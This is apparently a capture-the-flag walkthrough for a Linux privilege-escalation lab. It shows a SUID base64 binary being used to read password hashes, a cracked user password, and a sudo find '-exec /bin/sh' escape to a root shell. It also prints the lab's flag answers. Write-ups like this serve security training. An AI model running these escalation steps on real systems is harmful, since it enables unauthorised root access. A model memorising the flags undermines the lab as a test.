@@ -1,0 +1,104 @@
+## There is no guide to solve the task. Just informed you've learnt alot to solve the exercise from gained information
+
+Credentials of one user are provided as follow :
+
+Username: leonard
+Password: Penny123
+
+
+let's go then ............... 😎😎
+
+# What is the content of the flag1.txt file?
+
+There is no indication where exactly the flag1.txt file is available. 
+Let's use the find command to located the flag by running the following command: 
+
+find / -name flag1.txt  2>/dev/null 
+
+But it will result in nothing because flag may be hidden in somewhere where you've no permissions.
+
+Now it's time to check how many users are available : 
+
+[leonard@ip-10-10-6-20 home]$ ls
+leonard  missy  rootflag
+
+Try to enter as missy or rootflag user, it will ask you for password which unfortunately you don't have. 
+
+let's now analyzed as leonard user, can we run commands with "sudo". OH NO! 😥, even you don't have that option. 
+
+Let's find some binaries which have set user ID permission bit is set 
+_______________________________________________________________________________
+
+[leonard@ip-10-10-6-20 ~]$ find / -type f -perm -4000 2>/dev/null | grep base64
+/usr/bin/base64
+[leonard@ip-10-10-6-20 ~]$ 
+________________________________________________________________________________
+
+I grep command with base64 because I knew base64 binary have setuid. For you try to use without grep and understand how it works. 
+Now when I have found the vulnerability, I will use this to read the passwords (shadow) and usernames of user which are stored.
+I will store the them in text files and unshadow them and Crack the password of other users 
+Note: if you don't understand what is happening here , visit this : https://github.com/imahmedmunir/picoCTF-2024/blob/main/dont-you-love-banners
+
+ONce you go through this , you'll be able to crack the password of user "missy"
+PASSWORD IS Password1 😎😍
+________________________________________________________________________________________
+[leonard@ip-10-10-6-20 ~]$ su -l missy
+Password: 
+Last login: Mon Jun  7 21:19:11 CEST 2021 on pts/0
+[missy@ip-10-10-6-20 ~]$ cat /home/missy/Documents/flag1.txt 
+THM-42828719920544
+_________________________________________________________________
+
+# What is the content of the flag2.txt file?
+
+let's directly get to answer:
+see if you've sudo command as user missy to run something with sudo 
+___________________________________________________________________
+
+[missy@ip-10-10-6-20 ~]$ whoami
+missy
+[missy@ip-10-10-6-20 ~]$ sudo -l
+Matching Defaults entries for missy on ip-10-10-6-20:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User missy may run the following commands on ip-10-10-6-20:
+    (ALL) NOPASSWD: /usr/bin/find
+[missy@ip-10-10-6-20 ~]$ 
+_____________________________________________________________________________________________
+So, user missy can run find command with sudo 
+
+let's find flag2.txt now 
+
+____________________________________________________
+
+[missy@ip-10-10-6-20 ~]$ sudo find / -name flag2.txt 2>/dev/null
+/home/rootflag/flag2.txt
+
+--------------------------------------------------
+You found the path , but again the same issue you've no password for user rootflag.
+
+Worry not 😎
+
+This time you've access to run find command with elevated privileges. 
+So, run it with some logic and get the root access ................
+_______________________________________________________________
+
+[missy@ip-10-10-6-20 ~]$ sudo find / -exec /bin/sh \; -quit
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.2# 
+__________________________________________________________________________________________
+
+You easily got it , now you're root. Switch to directory and read the content  of flag2.txt
+______________________________________________________________________________________
+
+sh-4.2# cat /home/rootflag/flag2.txt
+THM-168824782390238
+sh-4.2# 
+
+Happy Hacker 
+
+
